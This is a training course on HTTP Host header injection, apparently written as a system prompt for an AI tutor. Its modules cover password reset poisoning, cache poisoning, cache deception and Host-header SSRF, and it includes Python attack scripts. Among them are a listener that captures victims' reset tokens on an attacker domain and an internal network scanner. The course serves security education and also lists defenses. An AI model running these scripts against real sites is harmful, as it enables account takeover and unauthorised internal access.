You are an elite Host Header Injection Learning AI, specializing in teaching HTTP Host header manipulation techniques. Your expertise focuses on educating bug bounty hunters about host header injection vulnerabilities, cache poisoning, and password reset exploitation.

Your mission is to guide aspiring security researchers through host header complexities, teaching them systematic approaches to testing host header manipulation, identifying injection opportunities, and developing secure host header handling implementations.

Key Learning Objectives:
- **Host Header Fundamentals**: Master HTTP Host header structure and usage
- **Injection Detection**: Learn host header injection vulnerability identification
- **Cache Poisoning**: Study cache-based host header exploitation techniques
- **Password Reset Exploitation**: Test password reset functionality host header manipulation
- **Web Cache Deception**: Learn cache key manipulation through host headers
- **SSRF via Host Header**: Study server-side request forgery through host manipulation
- **Header Validation**: Assess host header validation and sanitization mechanisms

Advanced Learning Concepts:
- **Absolute URL Injection**: Test absolute URL host header manipulation
- **Relative Path Exploitation**: Study relative path host header injection
- **Header Duplication**: Test duplicate host header handling
- **Port Specification**: Learn host header port manipulation techniques
- **Protocol Manipulation**: Study protocol specification in host headers
- **International Domain Names**: Test IDN host header handling
- **Validation Bypass**: Learn host header validation circumvention methods

Learning Process:
1. **HTTP Header Fundamentals**: Understand HTTP header structure and host header usage
2. **Injection Detection**: Learn host header injection vulnerability identification
3. **Cache Exploitation**: Study cache poisoning through host header manipulation
4. **Password Reset Testing**: Practice password reset host header exploitation
5. **Web Cache Deception**: Learn cache key manipulation techniques
6. **SSRF Integration**: Study SSRF through host header manipulation
7. **Secure Implementation**: Develop secure host header handling practices

Teaching Methodology:
- **Header Labs**: Hands-on HTTP header analysis and testing exercises
- **Injection Workshops**: Host header injection vulnerability identification training
- **Cache Exercises**: Cache poisoning through host header manipulation labs
- **Password Reset Labs**: Password reset host header exploitation testing frameworks
- **Cache Deception**: Web cache deception through host header testing guides
- **SSRF Integration**: SSRF through host header manipulation exercises
- **Real-World Scenarios**: Case studies of host header injection exploitation

Output Format:
- **Header Modules**: Structured learning units for HTTP header concepts
- **Injection Exercises**: Practical host header injection testing labs
- **Cache Labs**: Cache poisoning through host header manipulation exercises
- **Password Workshops**: Password reset host header exploitation testing frameworks
- **Deception Tutorials**: Web cache deception through host header testing guides
- **SSRF Labs**: SSRF through host header manipulation exercises
- **Case Studies**: Real-world host header injection exploitation examples

Example Learning Query: "Teach me host header injection from basics to expert level"

Ensure learning materials are comprehensive, practical, and focused on developing expert-level HTTP header security assessment skills.

---

# MODULE 1: HTTP HOST HEADER FUNDAMENTALS

## 1.1 Host Header Purpose

```text
HTTP Host Header:

Purpose:
- Required in HTTP/1.1 requests
- Identifies target server/website
- Enables virtual hosting
- Used for routing and security decisions

Example:
GET /index.html HTTP/1.1
Host: www.example.com

Without Host header:
- HTTP/1.0 doesn't require it
- Server uses IP address
- May return default site
```

## 1.2 Host Header Processing

```text
How servers process Host header:

1. Receive request
2. Extract Host header value
3. Match to virtual host
4. Route to appropriate handler
5. Use in URL generation

Processing variations:
- Apache: First matching VirtualHost
- Nginx: server_name directive
- IIS: Host header binding
- Tomcat: Host element
```

## 1.3 Host Header Validation

```text
Common validation methods:

1. Exact match:
   Host: example.com (valid)
   Host: evil.com (invalid)

2. Whitelist:
   Allowed: example.com, www.example.com
   Blocked: anything else

3. Regex match:
   Pattern: ^[a-z0-9-]+\.example\.com$
   Valid: sub.example.com
   Invalid: sub.evil.com

4. No validation (vulnerable):
   Any Host header accepted
```

## 1.4 Host Header in Different Contexts

```text
Host header usage contexts:

1. Reverse proxy routing
2. SSL/TLS certificate selection
3. Virtual host selection
4. URL generation in responses
5. Cache key calculation
6. Password reset email links
7. Redirect URL construction
```

## Practical Exercise 1.1: Host Header Analysis

```text
Objective: Understand Host header behavior in web applications.

Target: Test web application
Tools: Burp Suite, curl

Steps:
1. Send normal request, note Host header
2. Modify Host header to different values
3. Observe response changes
4. Test with IP address
5. Test with port number
6. Document behavior patterns

Deliverable: Host header behavior analysis
```

## Assessment Questions 1.1

```text
Q1: Why is the Host header required in HTTP/1.1?
Q2: How do different servers process Host headers?
Q3: What are common Host header validation methods?
Q4: How does Host header affect virtual hosting?
Q5: What contexts use the Host header value?
```

---

# MODULE 2: HOST HEADER INJECTION DETECTION

## 2.1 Basic Injection Testing

```text
Host header injection testing:

1. Modify Host header:
   Host: evil.com
   Host: target.com.evil.com
   Host: target.com%0d%0aInjected-Header: value

2. Add duplicate headers:
   Host: target.com
   Host: evil.com

3. Use absolute URL:
   GET http://evil.com/ HTTP/1.1
   Host: target.com

4. Test with port:
   Host: target.com:8080
   Host: target.com:80
```

```python
# Host header injection testing script
import requests

class HostHeaderTester:
    def __init__(self, target_url):
        self.target = target_url
        self.results = []
    
    def test_injection(self, host_value, description):
        """Test Host header injection"""
        try:
            # Parse target URL
            from urllib.parse import urlparse
            parsed = urlparse(self.target)
            
            # Send request with modified Host header
            headers = {'Host': host_value}
            resp = requests.get(
                self.target,
                headers=headers,
                timeout=10,
                allow_redirects=False,
                verify=False
            )
            
            result = {
                'description': description,
                'host_sent': host_value,
                'status': resp.status_code,
                'headers': dict(resp.headers),
                'body_snippet': resp.text[:200]
            }
            self.results.append(result)
            
            # Check for injection indicators
            indicators = [
                'evil.com' in resp.text,
                'evil.com' in str(resp.headers),
                host_value in resp.text,
                host_value in str(resp.headers)
            ]
            
            if any(indicators):
                result['vulnerable'] = True
                print(f"[VULNERABLE] {description}")
            else:
                result['vulnerable'] = False
                print(f"[SAFE] {description}")
                
        except Exception as e:
            print(f"[ERROR] {description}: {e}")
    
    def run_all_tests(self):
        """Run all Host header injection tests"""
        tests = [
            ("evil.com", "Basic injection"),
            ("target.com.evil.com", "Subdomain injection"),
            ("target.com%0d%0aInjected: true", "CRLF injection"),
            ("target.com:8080", "Port injection"),
            ("evil.com\r\nX-Injected: true", "Header injection"),
            ("target.com ", "Trailing space"),
            ("target.com\t", "Tab injection"),
        ]
        
        for host, desc in tests:
            self.test_injection(host, desc)
        
        return self.results

# Usage:
# tester = HostHeaderTester("https://target.com")
# tester.run_all_tests()
```

## 2.2 Detection via Response Analysis

```text
Response indicators of injection:

1. Redirects:
   - Location header contains injected host
   - Redirect URL uses injected host

2. Error messages:
   - Virtual host not found
   - Invalid host header
   - Access denied

3. Content reflection:
   - Host header reflected in page
   - URLs in page use injected host

4. Cache behavior:
   - Different cached responses
   - Cache key includes Host header
```

## 2.3 Detection via Timing

```text
Timing-based detection:

1. Response time differences:
   - Valid host: fast response
   - Invalid host: slow/error response

2. Connection behavior:
   - Connection reset
   - Timeout
   - Partial response

3. Server behavior:
   - Default virtual host
   - Error page
   - Redirect
```

## 2.4 Detection via Error Messages

```text
Error message analysis:

1. Server errors:
   - 500 Internal Server Error
   - 502 Bad Gateway
   - 503 Service Unavailable

2. Custom error messages:
   - "Invalid host header"
   - "Virtual host not found"
   - "Host not allowed"

3. Default pages:
   - Default web server page
   - Hosting provider page
   - "Site not configured"
```

## Practical Exercise 2.1: Injection Detection Lab

```text
Objective: Detect Host header injection vulnerabilities.

Target: Test web application
Tools: Burp Suite, Python script

Steps:
1. Establish baseline with normal Host header
2. Test various injection techniques
3. Analyze response differences
4. Check for redirect behavior
5. Test for CRLF injection
6. Document findings

Deliverable: Host header injection detection report
```

## Assessment Questions 2.1

```text
Q1: What Host header values should be tested for injection?
Q2: How do redirects indicate Host header injection?
Q3: What error messages suggest Host header vulnerabilities?
Q4: How can timing analysis detect injection?
Q5: What is CRLF injection in Host headers?
```

---

# MODULE 3: PASSWORD RESET POISONING

## 3.1 Password Reset Flow

```text
Password reset flow:

1. User requests password reset
2. Application generates reset token
3. Application sends email with reset link
4. User clicks link in email
5. User enters new password

Host header usage:
- Reset link generation: https://{Host}/reset?token=abc123
- Email contains link using Host header value
```

## 3.2 Poisoning Technique

```text
Password reset poisoning:

1. Request password reset for victim
2. Modify Host header to attacker domain
3. Application sends email with poisoned link
4. Victim clicks link (goes to attacker domain)
5. Attacker captures reset token
6. Attacker uses token to reset victim's password

Example:
POST /password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

## 3.3 Exploitation Requirements

```text
Prerequisites for poisoning:

1. Host header used in reset link
2. No domain validation in reset process
3. Attacker-controlled domain
4. Victim clicks poisoned link

Attack steps:
1. Set up attacker.com with token capture
2. Send poisoned reset request
3. Wait for victim to click
4. Capture token from attacker.com logs
5. Use token to reset password
6. Access victim's account
```

```python
# Password reset poisoning demonstration
import requests
import time
import threading

class PasswordResetPoison:
    def __init__(self, target_url, attacker_domain):
        self.target = target_url
        self.attacker_domain = attacker_domain
        self.captured_tokens = []
    
    def setup_listener(self):
        """Set up token capture listener"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        
        class TokenHandler(BaseHTTPRequestHandler):
            def __init__(self, *args, poison_instance=None, **kwargs):
                self.poison = poison_instance
                super().__init__(*args, **kwargs)
            
            def do_GET(self):
                # Capture token from URL
                token = self.path.split('token=')[1] if 'token=' in self.path else ''
                if token:
                    self.poison.captured_tokens.append(token)
                    print(f"[+] Captured token: {token}")
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Token captured!")
            
            def log_message(self, format, *args):
                pass  # Suppress logs
        
        # Start listener in background
        server = HTTPServer(('0.0.0.0', 80), 
                           lambda *args: TokenHandler(*args, poison_instance=self))
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        
        return server
    
    def send_poisoned_reset(self, victim_email):
        """Send poisoned password reset request"""
        headers = {
            'Host': self.attacker_domain,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        data = {'email': victim_email}
        
        try:
            resp = requests.post(
                f"{self.target}/password-reset",
                headers=headers,
                data=data,
                timeout=10
            )
            return resp.status_code
        except Exception as e:
            return str(e)
    
    def use_captured_token(self, token):
        """Use captured token to reset password"""
        # This would complete the password reset
        print(f"[*] Using token: {token}")
        # Implementation depends on target application

# Usage:
# poison = PasswordResetPoison("https://target.com", "attacker.com")
# poison.setup_listener()
# poison.send_poisoned_reset("victim@target.com")
# time.sleep(60)  # Wait for victim to click
# if poison.captured_tokens:
#     poison.use_captured_token(poison.captured_tokens[0])
```

## 3.4 Defense Mechanisms

```text
Password reset defenses:

1. Domain validation:
   - Whitelist allowed domains
   - Don't use Host header for reset links
   - Use hardcoded domain

2. Token security:
   - Short expiration time
   - Single-use tokens
   - Random token generation

3. Email security:
   - Don't include tokens in URLs
   - Use secure channels
   - Implement rate limiting

4. User awareness:
   - Show reset request details
   - Require confirmation
   - Log suspicious activity
```

## Practical Exercise 3.1: Password Reset Poisoning Lab

```text
Objective: Demonstrate password reset poisoning attack.

Target: Test application with password reset functionality
Tools: Attacker-controlled domain, Python

Steps:
1. Set up attacker domain with token capture
2. Request password reset with poisoned Host header
3. Capture reset token from attacker logs
4. Use token to reset password
5. Verify account access

Deliverable: Password reset poisoning proof of concept
```

## Assessment Questions 3.1

```text
Q1: How does password reset poisoning work?
Q2: What prerequisites are needed for the attack?
Q3: How do you capture the reset token?
Q4: What defenses prevent password reset poisoning?
Q5: How should reset links be generated securely?
```

---

# MODULE 4: CACHE POISONING VIA HOST HEADER

## 4.1 Web Cache Architecture

```text
Web caching concepts:

Cache layers:
- Browser cache
- CDN cache
- Reverse proxy cache
- Application cache

Cache keys:
- URL path
- Query parameters
- Host header (sometimes)
- Vary headers

Cache behavior:
- Cache HIT: Serve cached response
- Cache MISS: Fetch from origin
- Cache EXPIRED: Revalidate
```

## 4.2 Cache Poisoning Technique

```text
Cache poisoning via Host header:

1. Send request with poisoned Host header
2. Response cached with poisoned content
3. Subsequent users receive poisoned cache
4. Poisoned content served to victims

Example:
GET /page HTTP/1.1
Host: attacker.com

Response cached with attacker.com content
Victim requests /page, receives poisoned response
```

## 4.3 Cache Key Variations

```text
Cache key variations:

1. Host-only key:
   - Cache key: Host header
   - Poisoning: Modify Host header
   - Impact: All users affected

2. Path-only key:
   - Cache key: URL path
   - Poisoning: Different path
   - Impact: Path-specific

3. Host + Path key:
   - Cache key: Host + Path
   - Poisoning: Both must match
   - Impact: Specific combination

4. Vary header:
   - Cache key includes Vary headers
   - Poisoning: Modify Vary headers
   - Impact: Header-specific
```

```python
# Cache poisoning detection script
import requests
import time

class CachePoisonDetector:
    def __init__(self, target_url):
        self.target = target_url
        self.poisoned_hosts = []
    
    def test_cache_poisoning(self, path, host_values):
        """Test for cache poisoning via Host header"""
        results = []
        
        for host in host_values:
            # Send request with poisoned Host
            headers = {'Host': host}
            
            # First request (may be cached)
            resp1 = requests.get(
                f"{self.target}{path}",
                headers=headers,
                timeout=10
            )
            
            # Second request (should hit cache if poisoned)
            resp2 = requests.get(
                f"{self.target}{path}",
                headers=headers,
                timeout=10
            )
            
            # Compare responses
            if resp1.text == resp2.text:
                # Check if response contains injected content
                if host in resp1.text:
                    results.append({
                        'host': host,
                        'path': path,
                        'poisoned': True,
                        'response_size': len(resp1.text)
                    })
                    print(f"[POISONED] {host}{path}")
                else:
                    results.append({
                        'host': host,
                        'path': path,
                        'poisoned': False
                    })
            else:
                results.append({
                    'host': host,
                    'path': path,
                    'poisoned': False,
                    'note': 'Different responses'
                })
        
        return results
    
    def scan_paths(self, paths, hosts):
        """Scan multiple paths for cache poisoning"""
        all_results = []
        
        for path in paths:
            print(f"[*] Testing path: {path}")
            results = self.test_cache_poisoning(path, hosts)
            all_results.extend(results)
            time.sleep(1)  # Rate limiting
        
        return all_results

# Usage:
# detector = CachePoisonDetector("https://target.com")
# hosts = ["attacker.com", "evil.com"]
# paths = ["/", "/page", "/api"]
# results = detector.scan_paths(paths, hosts)
```

## 4.4 Exploitation Scenarios

```text
Cache poisoning exploitation:

1. XSS via cache:
   - Poison cache with XSS payload
   - All users receive XSS
   - Steal cookies, redirect, deface

2. Phishing via cache:
   - Poison cache with phishing page
   - Users see legitimate domain
   - Credential theft

3. Malware distribution:
   - Poison cache with malware
   - Users download from trusted domain
   - Malware infection

4. Information disclosure:
   - Poison cache with sensitive data
   - Users see other users' data
   - Privacy violation
```

## Practical Exercise 4.1: Cache Poisoning Lab

```text
Objective: Demonstrate cache poisoning via Host header.

Target: Application with caching
Tools: Burp Suite, Python

Steps:
1. Identify cacheable endpoints
2. Test Host header variations
3. Determine cache key structure
4. Poison cache with test content
5. Verify cache poisoning
6. Document exploitation potential

Deliverable: Cache poisoning proof of concept
```

## Assessment Questions 4.1

```text
Q1: How does cache poisoning via Host header work?
Q2: What are cache key variations?
Q3: How do you identify cacheable endpoints?
Q4: What attacks can be performed via cache poisoning?
Q5: What defenses prevent cache poisoning?
```

---

# MODULE 5: WEB CACHE DECEPTION

## 5.1 Web Cache Deception Concept

```text
Web Cache Deception:

Concept: Tricking cache into storing sensitive content

Mechanism:
1. Request sensitive page with cache-friendly path
2. Server returns sensitive content
3. Cache stores response
4. Attacker retrieves cached sensitive content

Example:
GET /account/settings.css HTTP/1.1
Host: target.com

Server: Returns settings page (ignores .css)
Cache: Stores settings page with .css extension
```

## 5.2 Deception Techniques

```text
Cache deception techniques:

1. Extension manipulation:
   - /page.js (JavaScript)
   - /page.css (CSS)
   - /page.png (Image)
   - /page (no extension)

2. Path confusion:
   - /page/.css
   - /page/..css
   - /page%00.css

3. Cache key manipulation:
   - Vary: Accept-Encoding
   - Cache-Control: public
   - X-Cache-Key variations

4. Response header manipulation:
   - Cache-Control headers
   - Expires headers
   - ETag headers
```

## 5.3 Detection Methods

```text
Cache deception detection:

1. Request with cacheable extension:
   - Request /admin.js
   - Check if response is cached
   - Verify response content

2. Check cache headers:
   - X-Cache: HIT
   - Age: > 0
   - Cache-Control: public

3. Compare cached vs uncached:
   - Request with cache-bust
   - Compare responses
   - Look for sensitive data

4. Monitor cache behavior:
   - Request same path multiple times
   - Check cache status changes
   - Identify caching patterns
```

```python
# Cache deception detection script
import requests
import hashlib

class CacheDeceptionDetector:
    def __init__(self, target_url):
        self.target = target_url
        self.findings = []
    
    def test_deception(self, path, extensions):
        """Test for cache deception"""
        results = []
        
        for ext in extensions:
            test_path = f"{path}.{ext}"
            
            # Request with cache-bust
            headers1 = {'Cache-Control': 'no-cache'}
            resp1 = requests.get(
                f"{self.target}{test_path}",
                headers=headers1,
                timeout=10
            )
            
            # Request without cache-bust
            resp2 = requests.get(
                f"{self.target}{test_path}",
                timeout=10
            )
            
            # Compare responses
            if resp1.text == resp2.text:
                # Check if response is sensitive
                if self.is_sensitive_response(resp1):
                    results.append({
                        'path': test_path,
                        'status': resp1.status_code,
                        'cached': True,
                        'sensitive': True,
                        'content_type': resp1.headers.get('Content-Type', '')
                    })
                    print(f"[DECEPTION] {test_path}")
        
        return results
    
    def is_sensitive_response(self, response):
        """Check if response contains sensitive data"""
        sensitive_indicators = [
            'password',
            'token',
            'secret',
            'api_key',
            'authorization',
            'cookie',
            'session',
            'private',
            'confidential'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in sensitive_indicators)
    
    def scan_endpoints(self, endpoints, extensions):
        """Scan multiple endpoints for cache deception"""
        all_findings = []
        
        for endpoint in endpoints:
            print(f"[*] Testing endpoint: {endpoint}")
            findings = self.test_deception(endpoint, extensions)
            all_findings.extend(findings)
        
        return all_findings

# Usage:
# detector = CacheDeceptionDetector("https://target.com")
# endpoints = ["/account", "/settings", "/profile"]
# extensions = ["js", "css", "png", "jpg"]
# findings = detector.scan_endpoints(endpoints, extensions)
```

## 5.4 Exploitation Scenarios

```text
Cache deception exploitation:

1. Session theft:
   - Deceive cache to store session data
   - Retrieve cached session
   - Hijack user sessions

2. API key theft:
   - Deceive cache to store API responses
   - Retrieve cached API keys
   - Abuse API access

3. Personal data theft:
   - Deceive cache to store user data
   - Retrieve cached personal information
   - Privacy violation

4. Business logic abuse:
   - Deceive cache to store business data
   - Retrieve cached sensitive information
   - Competitive advantage
```

## Practical Exercise 5.1: Cache Deception Lab

```text
Objective: Demonstrate web cache deception attack.

Target: Application with caching
Tools: Burp Suite, Python

Steps:
1. Identify sensitive endpoints
2. Test with cacheable extensions
3. Verify caching behavior
4. Retrieve cached sensitive data
5. Document exploitation potential

Deliverable: Cache deception proof of concept
```

## Assessment Questions 5.1

```text
Q1: What is web cache deception?
Q2: How does extension manipulation enable deception?
Q3: How do you detect cache deception vulnerabilities?
Q4: What sensitive data can be stolen via deception?
Q5: What defenses prevent cache deception?
```

---

# MODULE 6: SSRF VIA HOST HEADER

## 6.1 Host Header SSRF Concept

```text
SSRF via Host header:

Concept: Using Host header to make server request internal resources

Mechanism:
1. Send request with Host header pointing to internal resource
2. Server makes request to internal resource
3. Response returned to attacker

Example:
GET / HTTP/1.1
Host: internal-server:8080

Server requests internal-server:8080
Response returned to attacker
```

## 6.2 Internal Network Scanning

```text
Internal network scanning via Host header:

1. Scan internal IPs:
   - Host: 192.168.1.1
   - Host: 10.0.0.1
   - Host: 172.16.0.1

2. Scan internal ports:
   - Host: internal-server:22
   - Host: internal-server:80
   - Host: internal-server:443
   - Host: internal-server:8080

3. Identify running services:
   - Check response differences
   - Analyze error messages
   - Map internal network
```

```python
# Host header SSRF detection script
import requests
import concurrent.futures

class HostHeaderSSRF:
    def __init__(self, target_url):
        self.target = target_url
        self.internal_hosts = []
    
    def test_internal_host(self, host):
        """Test if Host header causes SSRF"""
        try:
            headers = {'Host': host}
            resp = requests.get(
                self.target,
                headers=headers,
                timeout=5,
                allow_redirects=False
            )
            
            # Analyze response
            indicators = {
                'status': resp.status_code,
                'length': len(resp.text),
                'server': resp.headers.get('Server', ''),
                'title': self.extract_title(resp.text)
            }
            
            return {
                'host': host,
                'accessible': resp.status_code != 502,
                'indicators': indicators
            }
        except requests.exceptions.ConnectionError:
            return {'host': host, 'accessible': False}
        except Exception as e:
            return {'host': host, 'error': str(e)}
    
    def extract_title(self, html):
        """Extract title from HTML response"""
        import re
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else ''
    
    def scan_internal_network(self, ip_range, ports):
        """Scan internal network via Host header"""
        targets = []
        
        # Generate target list
        for ip in ip_range:
            for port in ports:
                targets.append(f"{ip}:{port}")
        
        # Scan with threading
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.test_internal_host, t): t 
                      for t in targets}
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result.get('accessible'):
                    self.internal_hosts.append(result)
                    print(f"[ACCESSIBLE] {result['host']}")
        
        return self.internal_hosts

# Usage:
# ssrf = HostHeaderSSRF("https://target.com")
# ip_range = ["192.168.1.1", "192.168.1.2", "10.0.0.1"]
# ports = ["80", "443", "8080", "8443"]
# hosts = ssrf.scan_internal_network(ip_range, ports)
```

## 6.3 Internal Service Exploitation

```text
Internal service exploitation:

1. Database access:
   - Host: db-server:3306
   - Host: db-server:5432
   - Access database directly

2. Admin interface:
   - Host: admin-server:8080
   - Host: admin-server:9090
   - Access admin panels

3. API endpoints:
   - Host: api-server:3000
   - Host: api-server:5000
   - Access internal APIs

4. Configuration endpoints:
   - Host: config-server:8888
   - Host: config-server:9999
   - Access configuration data
```

## 6.4 Cloud Metadata Access

```text
Cloud metadata via Host header:

AWS metadata:
- Host: 169.254.169.254
- Path: /latest/meta-data/

Azure metadata:
- Host: 169.254.169.254
- Path: /metadata/instance?api-version=2021-02-01

GCP metadata:
- Host: metadata.google.internal
- Path: /computeMetadata/v1/

These endpoints provide:
- Instance credentials
- Security credentials
- Configuration data
- Network information
```

## Practical Exercise 6.1: Host Header SSRF Lab

```text
Objective: Demonstrate SSRF via Host header injection.

Target: Test application with SSRF vulnerability
Tools: Python, internal network access

Steps:
1. Identify Host header handling
2. Test with internal IP addresses
3. Scan internal network
4. Access internal services
5. Document findings

Deliverable: Host header SSRF proof of concept
```

## Assessment Questions 6.1

```text
Q1: How does Host header cause SSRF?
Q2: What internal resources can be accessed?
Q3: How do you scan internal networks via Host header?
Q4: What cloud metadata can be accessed?
Q5: What defenses prevent Host header SSRF?
```

---

# MODULE 7: HEADER DUPLICATION AND MANIPULATION

## 7.1 Duplicate Host Headers

```text
Duplicate Host header behavior:

1. First header wins:
   - Server uses first Host header
   - Second header ignored

2. Last header wins:
   - Server uses last Host header
   - First header ignored

3. Concatenation:
   - Server concatenates headers
   - Unexpected behavior

4. Error:
   - Server rejects request
   - 400 Bad Request

Testing:
Host: target.com
Host: evil.com
```

## 7.2 Header Folding

```text
Header folding (obsolete in HTTP/1.1):

Host: target\r\n
 .com

Some servers parse this as:
Host: target.com

Others see:
Host: target
 .com

This can bypass Host header validation.
```

## 7.3 Whitespace Manipulation

```text
Whitespace variations:

1. Space after colon:
   Host: target.com (normal)
   Host:target.com (no space)
   Host:  target.com (multiple spaces)

2. Tab characters:
   Host:\ttarget.com

3. Mixed whitespace:
   Host: \t target.com

4. Trailing whitespace:
   Host: target.com\t
   Host: target.com 
```

## 7.4 Case Manipulation

```text
Case variations:

HOST: target.com
Host: target.com
host: target.com
hOsT: target.com

Some servers are case-sensitive.
Others normalize to lowercase.
Testing reveals server behavior.
```

## Practical Exercise 7.1: Header Manipulation Lab

```text
Objective: Test Host header manipulation techniques.

Target: Test web application
Tools: Burp Suite, curl

Steps:
1. Test duplicate Host headers
2. Test header folding
3. Test whitespace variations
4. Test case variations
5. Document server behavior

Deliverable: Header manipulation behavior report
```

## Assessment Questions 7.1

```text
Q1: How do servers handle duplicate Host headers?
Q2: What is header folding and is it still supported?
Q3: How does whitespace manipulation affect Host header parsing?
Q4: Are Host headers case-sensitive?
Q5: What security implications do header manipulations have?
```

---

# MODULE 8: ADVANCED TECHNIQUES

## 8.1 Absolute URL Injection

```text
Absolute URL in request line:

GET http://evil.com/ HTTP/1.1
Host: target.com

Some servers:
- Use Host header for routing
- Use request line URL for content
- Mix both for URL generation

This can lead to:
- Open redirects
- SSRF
- Cache poisoning
```

## 8.2 Protocol Manipulation

```text
Protocol variations:

1. HTTP/1.0:
   GET / HTTP/1.0
   Host: target.com (optional)

2. HTTP/1.1:
   GET / HTTP/1.1
   Host: target.com (required)

3. HTTPS:
   GET / HTTP/1.1
   Host: target.com
   X-Forwarded-Proto: https

4. HTTP/2:
   :path: /
   :authority: target.com
```

## 8.3 Port Specification

```text
Port variations:

1. Standard ports:
   Host: target.com:80 (HTTP)
   Host: target.com:443 (HTTPS)

2. Non-standard ports:
   Host: target.com:8080
   Host: target.com:8443

3. No port:
   Host: target.com

4. Port 0:
   Host: target.com:0

Different servers handle ports differently.
```

## 8.4 International Domain Names

```text
IDN variations:

1. Unicode:
   Host: таргет.com (Cyrillic)

2. Punycode:
   Host: xn--e1afmapc.com

3. Mixed scripts:
   Host: target.com (Latin + Cyrillic)

4. Homograph attacks:
   Host: target.com (lookalike characters)

This can bypass domain validation.
```

## Practical Exercise 8.1: Advanced Manipulation Lab

```text
Objective: Test advanced Host header manipulation techniques.

Target: Test web application
Tools: Burp Suite, Python

Steps:
1. Test absolute URL injection
2. Test protocol manipulation
3. Test port specification
4. Test IDN variations
5. Document bypass techniques

Deliverable: Advanced manipulation techniques report
```

## Assessment Questions 8.1

```text
Q1: How does absolute URL injection work?
Q2: What protocol variations affect Host header handling?
Q3: How do port specifications affect Host header parsing?
Q4: What are IDN-based attacks?
Q5: How can advanced techniques bypass security controls?
```

---

# MODULE 9: CASE STUDIES

## 9.1 Case Study: Password Reset Poisoning

```text
Password reset poisoning case:

Discovery:
- Password reset used Host header for link generation
- No domain validation
- Attacker could poison reset links

Exploitation:
1. Attacker requests reset for victim
2. Modifies Host to attacker.com
3. Victim receives poisoned email
4. Victim clicks link (goes to attacker.com)
5. Attacker captures reset token
6. Attacker resets victim's password
7. Attacker accesses victim's account

Impact:
- Account takeover
- Data breach
- Business logic abuse

Remediation:
- Use hardcoded domain for reset links
- Validate Host header
- Implement token security
```

## 9.2 Case Study: Cache Poisoning

```text
Cache poisoning case:

Discovery:
- Host header included in cache key
- No validation on Host header
- Attacker could poison cache

Exploitation:
1. Attacker sends request with poisoned Host
2. Response cached with poisoned content
3. All users receive poisoned response
4. XSS payload executed in user browsers
5. Cookies stolen, accounts compromised

Impact:
- Mass account compromise
- Malware distribution
- Brand reputation damage

Remediation:
- Remove Host header from cache key
- Validate Host header
- Implement cache controls
```

## 9.3 Case Study: SSRF via Host Header

```text
SSRF via Host header case:

Discovery:
- Host header used for internal routing
- No validation on Host header
- Attacker could access internal resources

Exploitation:
1. Attacker sends request with internal Host
2. Server makes request to internal resource
3. Internal data returned to attacker
4. Internal network mapped
5. Sensitive data accessed

Impact:
- Internal network exposure
- Sensitive data theft
- Lateral movement

Remediation:
- Validate Host header against whitelist
- Implement network segmentation
- Monitor for SSRF attempts
```

## Assessment Questions 9.1

```text
Q1: What was the root cause in the password reset case?
Q2: How did cache poisoning affect users?
Q3: What internal resources were exposed via SSRF?
Q4: What are common themes in these cases?
Q5: How would you improve remediation?
```

---

# MODULE 10: FINAL ASSESSMENT

## 10.1 Practical Exam

```text
Host header injection certification exam:

Part 1: Detection (25 points)
- Detect Host header injection
- Identify injection type
- Document testing methodology

Part 2: Exploitation (50 points)
- Demonstrate password reset poisoning
- Demonstrate cache poisoning
- Demonstrate SSRF
- Document exploitation chains

Part 3: Defense (25 points)
- Recommend preventive measures
- Implement Host header validation
- Document defense strategy

Total: 100 points, 80% to pass
```

## 10.2 Certification Requirements

```text
Host Header Injection Certification:

1. Complete all 10 modules
2. Pass practical exam
3. Submit 3 injection reports
4. Demonstrate responsible disclosure
5. Contribute to header security research
```

## 10.3 Career Pathways

```text
Career roles for header injection specialists:

1. Security Researcher
2. Application Security Engineer
3. Penetration Tester
4. Red Team Operator
5. Bug Bounty Hunter
6. Web Security Specialist
```

---

# APPENDIX A: TOOLS AND RESOURCES

## A.1 Host Header Testing Tools

```text
Essential tools:

1. Burp Suite - HTTP header manipulation
2. curl - HTTP request testing
3. Python requests - Custom scripting
4. Host header injection extensions
5. Cache analysis tools
6. Network scanning tools
```

## A.2 Online Resources

```text
Learning resources:

1. OWASP Host header injection
2. PortSwigger research
3. HackTricks header manipulation
4. Security conference talks
5. Bug bounty reports
```

## A.3 Practice Platforms

```text
Hands-on practice:

1. PortSwigger Academy (header labs)
2. HackTheBox challenges
3. TryHackMe rooms
4. Custom vulnerable applications
```

---

# APPENDIX B: GLOSSARY

```text
Key terms:

- Host Header: HTTP header identifying target server
- Virtual Hosting: Multiple sites on one server
- Cache Poisoning: Injecting malicious content in cache
- SSRF: Server-Side Request Forgery
- Password Reset Poisoning: Manipulating reset links
- CRLF: Carriage Return Line Feed
- IDN: International Domain Name
- Open Redirect: Unvalidated redirect
```

---

*Last Updated: 2026-06-10*
*Version: 2.0*
*Classification: Educational Use Only*